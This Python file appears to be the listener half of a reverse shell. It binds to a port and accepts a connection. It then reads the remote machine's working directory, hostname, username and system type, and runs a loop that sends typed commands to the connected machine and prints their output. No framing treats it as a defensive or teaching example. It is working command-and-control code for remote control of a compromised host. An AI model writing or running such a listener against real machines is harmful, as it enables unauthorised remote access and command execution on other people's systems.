import socket

from colorama import Fore, init

init(autoreset=True)


class Server:
    def __init__(self, ip: str, port: int):
        self.host = ip
        self.port = port
        self.socket_addr = (self.host, self.port)

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.socket.bind(self.socket_addr)
        print(self.socket.getsockname()[1])

        self.socket.listen(5)

        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTYELLOW_EX} Awaiting connection.')

        self.buffer_size: int = 1024 * 128
        self.separator: str = '<||>'

        self.client_socket, self.client_addr = self.socket.accept()

        print(f'{Fore.LIGHTGREEN_EX}[+] Accepted connection from: {self.socket_addr[0]}:{self.socket_addr[1]}')

        self.working_directory = self.client_socket.recv(self.buffer_size).decode()
        self.hostname = self.client_socket.recv(self.buffer_size).decode()
        self.username = self.client_socket.recv(self.buffer_size).decode()
        self.system_type = self.client_socket.recv(self.buffer_size).decode()

        self.start_console()

    def start_console(self) -> None:
        while True:
            command_input = input(f'{self.username}@{self.hostname}:{self.working_directory}# ')
            if not command_input:
                continue

            self.client_socket.send(command_input.encode())

            output = self.client_socket.recv(self.buffer_size).decode()
            results, self.working_directory = output.split(self.separator)

            print(results)


if __name__ == '__main__':
    Server('localhost', 9999)
